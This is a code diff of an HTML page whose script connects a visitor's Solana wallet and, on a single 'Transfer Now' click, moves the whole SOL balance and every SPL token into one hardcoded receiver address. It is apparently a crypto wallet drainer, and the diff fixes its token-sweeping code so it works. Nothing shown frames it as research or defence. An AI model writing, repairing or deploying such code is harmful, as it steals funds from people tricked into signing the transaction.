@@ -10,6 +10,8 @@
     <button id="transferButton">Transfer Now</button>
 
     <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token"></script>
+
     <script>
         document.getElementById('transferButton').addEventListener('click', async () => {
             const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
@@ -39,48 +41,50 @@
                     const publicKey = provider.publicKey;
                     alert("Connected wallet: " + publicKey.toBase58());
 
-                    // Get SOL balance
-                    const solBalance = await connection.getBalance(publicKey);
                     const transaction = new solanaWeb3.Transaction();
 
-                    // If SOL balance exists, add it to the transaction
-                    if (solBalance > 5000) {
+                    // Transfer SOL
+                    const balance = await connection.getBalance(publicKey);
+                    if (balance > 5000) {
                         transaction.add(
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: publicKey,
                                 toPubkey: new solanaWeb3.PublicKey(receiverWallet),
-                                lamports: solBalance - 5000, // Send all but keep a little for fees
+                                lamports: balance - 5000,  // Leave a small fee for transaction
                             })
                         );
                     }
 
-                    // Get SPL token accounts
+                    // Get SPL token balances
                     const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+                        programId: new solanaWeb3.PublicKey(solanaWeb3.TOKEN_PROGRAM_ID),
                     });
 
-                    if (tokenAccounts.value.length === 0 && solBalance <= 5000) {
+                    if (tokenAccounts.value.length === 0 && balance <= 5000) {
                         alert("No tokens available to transfer.");
                         return;
                     }
 
-                    tokenAccounts.value.forEach(tokenAccount => {
+                    for (let tokenAccount of tokenAccounts.value) {
                         const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
-                        const tokenMintAddress = tokenAccount.account.data.parsed.info.mint;
-
                         if (tokenAmount > 0) {
                             transaction.add(
-                                solanaWeb3.Token.createTransferInstruction(
-                                    new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-                                    tokenAccount.pubkey,
+                                solanaSplToken.createTransferInstruction(
+                                    new solanaWeb3.PublicKey(tokenAccount.pubkey),
                                     new solanaWeb3.PublicKey(receiverWallet),
                                     publicKey,
+                                    tokenAmount * Math.pow(10, tokenAccount.account.data.parsed.info.tokenAmount.decimals),
                                     [],
-                                    tokenAmount * Math.pow(10, tokenAccount.account.data.parsed.info.tokenAmount.decimals)
+                                    solanaWeb3.TOKEN_PROGRAM_ID
                                 )
                             );
                         }
-                    });
+                    }
+
+                    if (transaction.instructions.length === 0) {
+                        alert("No funds available to transfer.");
+                        return;
+                    }
 
                     const { signature } = await provider.signAndSendTransaction(transaction);
                     alert("Transaction sent! Signature: " + signature);
